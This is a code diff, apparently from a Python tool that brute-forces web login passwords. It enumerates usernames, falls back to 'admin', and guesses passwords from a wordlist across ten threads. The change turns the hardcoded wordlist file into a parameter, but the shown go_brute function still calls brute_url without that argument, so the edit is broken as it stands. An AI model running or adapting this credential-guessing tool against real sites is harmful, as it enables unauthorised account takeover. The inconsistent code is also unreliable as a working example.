@@ -47,7 +47,7 @@ def exploit(url, user_url, list_password):
 	except Exception as e:
 			print(colored("[{}][!] Something Wrong :(".format(local_time()), "red"))
 
-def brute_url(url):
+def brute_url(url,wordlist):
 	try:
 		username_url = fetching_user(url)
 		user = []
@@ -58,7 +58,7 @@ def brute_url(url):
 			print(colored('[{}][+] try With default username [admin]'.format(local_time()), "green"))
 			user.append("admin")
 
-		password = "wordlist.txt"
+		password = wordlist
 
 		with ThreadPoolExecutor(max_workers=10) as executor:
 			for user_url in user:
@@ -73,7 +73,7 @@ def brute_url(url):
 	except Exception as e:
 		print(colored("[{}][!] Something Wrong :(".format(local_time()), "red"))
 
-def go_brute(url):
+def go_brute(url,):
 	try:
 		print(colored("[+] Start Brute Force on {}".format(local_time()), "yellow"))
 		brute_url(url)
